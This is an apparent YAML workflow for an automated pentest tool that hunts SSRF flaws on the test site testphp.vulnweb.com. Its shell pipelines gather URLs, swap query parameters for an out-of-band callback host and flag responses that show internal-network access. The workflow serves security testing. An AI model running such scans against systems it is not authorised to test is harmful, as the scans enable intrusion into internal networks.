description: Searches for Server-Side Request Forgery (SSRF) vulnerabilities by first gathering URLs from the target using 'gau'. These URLs are then filtered for potential SSRF vulnerabilities using 'gf', deduplicated, and checked with 'httpx' to ensure they are alive. Each URL is modified to replace query parameters with the 'burpcollaborator_link', a tool commonly used for detecting external service interaction and SSRF vulnerabilities. These modified URLs are accessed with 'curl', and if any responses contain the string "compute.internal", indicative of internal network access via SSRF, the URL is flagged as vulnerable. This process identifies critical security issues where an attacker could force the server to make unintended network calls.
tags: ssrf, security, bash, curl
params: target=testphp.vulnweb.com burpcollaborator_link=gyhitxcgdojfoxhbkidywa6u4mz53xaok.oast.fun, header="Example:Blackdagger"
# Change header without blank if you need or add authorization
env:
  - HOME: /root/
  - LOG_DIR: ${HOME}/logs
  - PATH: /usr/local/bin:${PATH}
steps:
  - name: CustomSSRF-External
    command: bash
    script: |
      gau ${target//\"} | gf ssrf | sort -u |anew | ~/go/bin/httpx | qsreplace $burpcollaborator_link | xargs -I % -P 25 sh -c 'curl -ks "%" 2>&1 | grep "compute.internal" && echo "SSRF VULN! %" || true'
  - name: CustomSSRF-Internal
    command: bash
    script: |
      ~/go/bin/httpx -u ${target//\"} | katana -H "$header" qurl  | gf ssrf | sort -u |anew | ~/go/bin/httpx | qsreplace $burpcollaborator_link | xargs -I % -P 25 sh -c 'curl -ks "%" 2>&1 | grep "compute.internal" && echo "SSRF VULN! %" || true'
  - name: AutoSSRF
    command: bash
    script: |
      ~/go/bin/httpx -u $target -o resSSRF_${target//\"}.txt ; wapiti -u "$(cat resSSRF_${target//\"}.txt)" -m ssrf -H "$header"